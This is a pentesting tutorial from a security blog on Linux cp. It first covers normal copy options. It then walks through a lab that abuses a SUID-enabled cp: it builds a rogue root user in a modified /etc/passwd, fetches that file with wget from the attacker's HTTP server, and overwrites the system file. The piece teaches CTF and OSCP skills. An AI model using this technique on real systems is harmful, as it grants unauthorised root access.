<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/privilege-escalation/" rel="category tag">Privilege Escalation</a></span>            </div>
            <h1 class="post-title entry-title">Linux for Pentester: cp Privilege Escalation</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/linux-for-pentester-cp-privilege-escalation/" rel="bookmark"><time class="entry-date published" datetime="2019-07-01T04:49:59+00:00">July 1, 2019</time><time class="updated" datetime="2025-06-07T14:01:02+00:00">June 7, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p class="ai-optimize-6 ai-optimize-introduction"><span style="color: #000000;">In this article, we are going to grasp another very worthwhile command i.e. “cp” (copy) and will cover all the basic function of ‘cp” command that a user can use. As we know this command helps in copying the file/directories from the source to destination so, in this article we will study how we can attain the utility of this command in Privilege Escalation.</span></p>
<p class="ai-optimize-7"><span style="color: #000000;"><strong><em>Note: “The main objective of publishing the series of “Linux for pentester” is to introduce the circumstances and any kind of hurdles that can be faced by any pentester while solving CTF challenges or OSCP labs which are based on Linux privilege escalations. Here we do not criticizing any kind of misconfiguration that a network or system administrator does for providing higher permissions on any programs/binaries/files &amp; etc.”  </em></strong></span></p>
<h3 class="ai-optimize-8"><span style="color: #800000;"><strong>Table of Content</strong></span></h3>
<p class="ai-optimize-9"><span style="color: #000000;"><strong>Introduction to cp</strong></span></p>
<ul>
<li class="ai-optimize-10"><span style="color: #000000;">Major Operation performed using cp</span></li>
</ul>
<p class="ai-optimize-11"><span style="color: #000000;"><strong>Exploiting cp</strong></span></p>
<ul>
<li class="ai-optimize-12"><span style="color: #000000;">SUID Lab setups for Privilege Escalation</span></li>
<li class="ai-optimize-13"><span style="color: #000000;">Exploiting SUID</span></li>
</ul>
<h3 class="ai-optimize-14"><span style="color: #800000;"><strong>Introduction to cp</strong></span></h3>
<p class="ai-optimize-15"><span style="color: #000000;"><strong>cp</strong> stands for <strong>copy</strong>. This command helps to copy files or group of files or directory from its source location to the destination. This generates an exact image of a file on a disk with the different file name. cp command needs at least two filenames in its arguments.</span></p>
<p class="ai-optimize-16"><span style="color: #000000;">Very first, we will run its help command to make our readers more aware of the use of “cp” command.</span></p>
<pre class="lang:default decode:true">cp --help</pre>
<p class="ai-optimize-17"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-1A_EeDBZP8I/XRmM5Xp96PI/AAAAAAAAe-k/u1zfl0qkXswEkdy9iXxZoss3gp-A03-AgCLcBGAs/s1600/1.png"/></span></p>
<p class="ai-optimize-18"><span style="color: #000000;"><strong>Copy single file to the destination</strong>: As said above that cp command helps the user to copy the content of source file to its destination so now, here I am replicating the content of single file (raj.txt) to new file (chiya.txt). If the destination file already exits so this command simply overwrites the file without any warning message but if the destination file doesn’t exist, then first “cp” will create a new file then will copy the content of source file as per user’s desire.</span></p>
<pre class="lang:default decode:true">cp raj.txt chiya.txt</pre>
<p class="ai-optimize-19"><span style="color: #000000;">By framing the above command cp will copy all the content of file <strong>raj.txt </strong>to<strong> chiya.txt</strong> as shown in below image.</span></p>
<p class="ai-optimize-20"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-nFrS-oO8sFo/XRmM7dbd8NI/AAAAAAAAe-4/m0Te1nuZZUYZl9p0geFcsaBp-wBr3DzuACLcBGAs/s1600/2.png"/></span></p>
<p class="ai-optimize-21"><span style="color: #000000;"><strong>Copy multiple files to a directory</strong>: By the help of this command, we not only copy the single file but also can copy multiple files to a directory whenever needed. Suppose we have multiple files as shown in the below image for the reader’s reference and we want to copy all at once to a specific directory then we can frame command as shown below:</span></p>
<pre class="lang:default decode:true">cp 1 2 3 chiya.txt demo/</pre>
<p class="ai-optimize-22"><span style="color: #000000;">By this command cp will copy the entire content from the file “1,2,3, chiya.txt” to mentioned destinated directory. If the directory doesn’t exist then first it will create a new directory and will copy the content to it but, if the directory already exists then cp will erase all content from the destinated directory and will simply overwrite to it so be careful while copying the content from source to location.</span></p>
<p class="ai-optimize-23"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-t6QZyxq5Wfs/XRmM7oiDveI/AAAAAAAAe-8/7ChM_gwRFoYSLF-LXtioe7s7FpNnYf1bQCLcBGAs/s1600/3.png"/></span></p>
<p class="ai-optimize-24"><span style="color: #000000;"><strong>Copy source directory to the destination</strong>: With this option “cp”<strong> </strong>command shows its recursive performance by replicating the entire directory structure recursively. Suppose we want to copy all files and directories that a directory contains then in this case we will simply copy the whole directory instead to copy its files one by one to our desired destinated path.</span></p>
<p class="ai-optimize-25"><span style="color: #000000;">In the below image I have copied the entire content of source directory “ignite” to destinated directory “demo2” (which is not exits). One can use <strong>-r or -R </strong>both argument for this purpose.</span></p>
<pre class="lang:default decode:true">cp -R ignite demo2</pre>
<p class="ai-optimize-26"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-SK9-iwW7vEE/XRmM77pw5BI/AAAAAAAAe_A/9era90IuiVcSie7IKGPxDzf3JCoelAdrQCLcBGAs/s1600/4.png"/></span></p>
<p class="ai-optimize-27"><span style="color: #000000;"><strong>Interactive prompt</strong>: Normally when we use the cp command then it simply overwrites the file if it exists so to make it prompt for confirmation while copying a file, we will use the option <strong>“-i”</strong>. Using this argument, the command will prompt to overwrite the file which helps the user to save the content from being erased while copying from source to destination.</span></p>
<pre class="lang:default decode:true">cp -i chiya.txt author</pre>
<p class="ai-optimize-28"><span style="color: #000000;">Here I want to copy the content of “chiya.txt” to “author” which have some of its own content so when I will use “-i” option then it will prompt me for its confirmation of overwriting the text.</span></p>
<p class="ai-optimize-29"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-fAO9-ArYQtU/XRmM8B8eq0I/AAAAAAAAe_E/6BztlV8nDpoW2aG2EpXFIRv8mgzsFIw7wCLcBGAs/s1600/5.png"/></span></p>
<p class="ai-optimize-30"><span style="color: #000000;"><strong>Backup a file</strong>:  Whenever we need to create a backup of the destination file then we will use the “-b” option for this purpose. cp helps to create a backup of the file in the same folder with the different name and in a different format.</span></p>
<pre class="lang:default decode:true">cp -b chiya.txt author</pre>
<p class="ai-optimize-31"><span style="color: #000000;"> On framing the above command cp will create a backup of file “author” in the same folder with a different name.</span></p>
<p class="ai-optimize-32"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Fh3JPMmVXpI/XRmM8sGCQTI/AAAAAAAAe_I/8l2DofD7ybchNCqBc8LnV5voC6fzvexRACLcBGAs/s1600/6.png"/></span></p>
<p class="ai-optimize-33"><span style="color: #000000;"><strong>Copying using * wildcard</strong>: Suppose we have many text documents in a directory, and we want to replicate it into another directory so, copy all files one by one will take lots of time if specify all file names as the argument but by using * wildcard it becomes simple.</span></p>
<pre class="lang:default decode:true">cp *.txt folder</pre>
<p class="ai-optimize-34"><span style="color: #000000;">On typing above command, cp will copy all “txt” to destination.</span></p>
<p class="ai-optimize-35"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-2RfnMQaw1YQ/XRmM8s86VfI/AAAAAAAAe_M/sZsJaqoXzpI5jn0XcMDFXjRmPloAPwsFgCLcBGAs/s1600/7.png"/></span></p>
<p class="ai-optimize-36"><span style="color: #000000;"><strong>Force copy</strong>: Sometimes it happens when user unable to open a file to perform writing operation due to permission which is set upon that in such case we use force copy “-f” option in cp command which helps the user to delete the destinated file first and then copying of content is done from source to destination file.</span></p>
<pre class="lang:default decode:true">cp -f chiya.txt Example.txt</pre>
<p class="ai-optimize-37"><span style="color: #000000;">In the below screenshot we have seen that Example.txt file doesn’t have write permission to it so on using “-f” argument followed by cp command user can copy the content of source file to destination file. </span></p>
<p class="ai-optimize-38"><span style="color: #000000;"><img decoding="async" class="" src="https://1.bp.blogspot.com/-aFNE6MkORzc/XRmM9OCOsVI/AAAAAAAAe_Q/hk3QiF-3BmcCpgiLY86lEb5IbUooOf35wCLcBGAs/s1600/9.png"/></span></p>
<h3 class="ai-optimize-39"><span style="color: #800000;"><strong>SUID Lab setups for Privilege Escalation</strong></span></h3>
<p class="ai-optimize-40"><span style="color: #000000;">SUID: Set User ID is a type of permission that allows users to execute a file with the permissions of a specified user. Assume we are accessing the victim’s machine as a non-root user and we found suid bit enabled binaries, then those file/program/command can run with root privileges.</span></p>
<p class="ai-optimize-41"><span style="color: #000000;">Read more from here: <a style="color: #000000;" href="https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/">https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/</a></span></p>
<p class="ai-optimize-42"><span style="color: #000000;">Now we are going to give SUID permission on cp so that a local user can take the privilege of cp as the root user.</span></p>
<p class="ai-optimize-43"><span style="color: #000000;">Hence type following for enabling SUID bit:</span></p>
<pre class="lang:default decode:true">which cp
chmod u+s /bin/cp
ls -la /bin/cp</pre>
<p class="ai-optimize-44"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-xt2HnaHRmYs/XSAdNiGOVnI/AAAAAAAAfAw/f4eRQT3KhWk6UsvE4dF47XJkXIuF5TCHACLcBGAs/s1600/10.png"/></span></p>
<h3 class="ai-optimize-45"><span style="color: #800000;"><strong>Exploiting SUID</strong></span></h3>
<p class="ai-optimize-46"><span style="color: #000000;">For this, we will connect to the target machine with ssh, therefore, type following command to get access through local user login.</span></p>
<pre class="lang:default decode:true">ssh test@192.168.0.15</pre>
<p class="ai-optimize-47"><span style="color: #000000;">Then use find command to identify binaries having SUID permission.</span></p>
<pre class="lang:default decode:true">find / -perm -u=s -type f 2&gt;/dev/null</pre>
<p class="ai-optimize-48"><span style="color: #000000;">So here we came to know that SUID bit is enabled for so many binary files, but we need /bin/cp.</span></p>
<p class="ai-optimize-49"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-bmq6Pve2TZ0/XSAdONSlmzI/AAAAAAAAfA4/Pe8ouOKc0LoiuA2_U1JOPhHbG3kv_CslwCLcBGAs/s1600/12.png"/></span></p>
<p class="ai-optimize-50"><span style="color: #000000;">As we know, cp has suid permission so taking advantage of this right we will try to escalate the root privilege by injecting a new user inside the /etc/passwd file.</span></p>
<p class="ai-optimize-51"><span style="color: #000000;">First, we will open our /etc/passwd file followed by a tail command which will read this file from its end and help us to know that the file ends with the user “test”.</span></p>
<p class="ai-optimize-52"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-XYSMhSg-WW4/XRmM6Ea7wJI/AAAAAAAAe-o/d6qxjwKLRxgoh9BhrKYDAV7MtWf4KpgSgCLcBGAs/s1600/13.png"/></span></p>
<p class="ai-optimize-53"><span style="color: #000000;">Now we are creating the salt value of password for our new user and this will be done by using “openssl” following by the command as mentioned in the screenshot below.</span></p>
<pre class="lang:default decode:true">openssl passwd -1 -salt ignite pass123</pre>
<p class="ai-optimize-54"><span style="color: #000000;">And we will get our hash value copy it for further use.</span></p>
<p class="ai-optimize-55"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-c-GHQGCWKM0/XRmM6cyAw9I/AAAAAAAAe-s/OQVjNR_nR0wldCsVMZpFov48LUq7xQbxQCLcBGAs/s1600/14.png"/></span></p>
<p class="ai-optimize-56"><span style="color: #000000;">On moving ahead for the completion of this task now I have copied the entire content of /etc/passwd file in our local machine and will edit a new record for the user “chiya” then paste the above-copied hash password in the record as shown below.</span></p>
<p class="ai-optimize-57"><span style="color: #000000;">Name this file as <strong>passwd</strong> and run python HTTP server for transferring this file into victim’s machine.</span></p>
<pre class="lang:default decode:true">python -m SimpleHTTPServer</pre>
<p class="ai-optimize-58"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-f8tvzPf9rv0/XRmM6VXM7fI/AAAAAAAAe-w/M19QvEpvIMIKRumMmeEd-w44-SCoqlmDQCLcBGAs/s1600/15.png"/></span></p>
<p class="ai-optimize-59"><span style="color: #000000;">Now we want to inject our modified passwd file inside /etc folder to replace the original passwd file. We will use wget to download the passwd file from our machine (Kali Linux) inside /tmp directory.</span></p>
<pre class="lang:default decode:true ">cd /tmp
wget http://192.168.0.16:8000/passwd</pre>
<p class="ai-optimize-60"><span style="color: #000000;">Now by the help of cp command, we can easily copy the content of source file to the destination as shown in below image.</span></p>
<pre class="lang:default decode:true">cp passwd /etc/passwd
tail /etc/passwd</pre>
<p class="ai-optimize-61"><span style="color: #000000;">Now let’s switch to user chiya that own root user’s privileges and can access the root shell.</span></p>
<pre class="lang:default decode:true">su chiya
password: pass123
id</pre>
<p class="ai-optimize-62"><span style="color: #000000;"><strong>Conclusion:</strong> Hence you can notice from the given below image we have escalated the root privilege by abusing SUID permission on cp. Similarly, we can exploit the sudo permission assign on CP program.</span></p>
<p class="ai-optimize-63"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-sbR6s5_QWjA/XRmM6tWbnfI/AAAAAAAAe-0/WCX_wpllX3UmTFvS8M7YwEIit6O1BO82QCLcBGAs/s1600/16.png"/></span></p>
<p class="ai-optimize-6"><span style="color: #000000;">To Learn more about Privilege Escalation. Follow this</span> <a href="https://www.hackingarticles.in/category/privilege-escalation/">Link.</a></p>
<p class="ai-optimize-64"><span style="color: #000000;"><strong>Author</strong>: Komal Singh is a Cyber Security Researcher and Technical Content Writer, she is completely enthusiastic pentester and Security Analyst at Ignite Technologies. Contact <a style="color: #000000;" href="https://www.linkedin.com/in/komal-rajput-26b783131/"><strong>Here</strong></a></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
